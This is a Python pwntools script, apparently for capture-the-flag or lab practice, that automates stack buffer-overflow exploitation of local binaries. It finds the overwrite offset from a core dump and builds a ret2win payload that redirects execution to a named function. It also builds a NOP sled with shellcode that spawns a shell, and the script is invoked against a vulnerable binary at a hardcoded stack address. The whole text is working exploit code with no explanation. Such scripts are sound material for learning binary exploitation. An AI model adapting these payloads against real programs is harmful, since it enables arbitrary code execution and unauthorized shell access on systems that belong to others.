from pwn import *

context.terminal = ('alacritty', '-e')

def get_offset(file_path, cyclic_size):
    context.binary = ELF(file_path)
    p = process()
    p.sendline(cyclic(cyclic_size, n=8))
    p.wait()

    core = p.corefile

    if context.bits==32:
        offset = cyclic_find(core.read(core.esp, 8), n=8) - 4
    else:
        offset = cyclic_find(core.read(core.rsp, 8), n=8) - 4

    return offset

def local_ret2win(file_path, fun_name):
    context.binary = ELF(file_path)

    offset = get_offset(file_path, 500)

    p = process()
    payload = b'A'*offset
    if context.bits == 32:
        payload += p32(context.binary.symbols[fun_name])
    else:
        payload += p64(context.binary.symbols[fun_name])
    log.info(p.clean())         
    p.sendline(payload)

    log.info(p.clean())

def local_simple_shellcode(file_path, buffer_addr):
    context.binary = ELF(file_path)

    p = process()

    offset = get_offset(file_path, 500)
    nop_len = int(offset/2) 

    payload = asm(shellcraft.nop()) * nop_len
    payload += asm(shellcraft.sh())
    payload = payload.ljust(offset, b'A') 
    if context.bits == 32:
        payload += p32(buffer_addr+int(nop_len/2))
    else:
        payload += p64(buffer_addr+int(nop_len/2))
    
    log.info(p.clean())
    p.sendline(payload)
    p.interactive()

# 0xffffd4f0
local_simple_shellcode('./shellcode/vuln', 0xffffd4f0)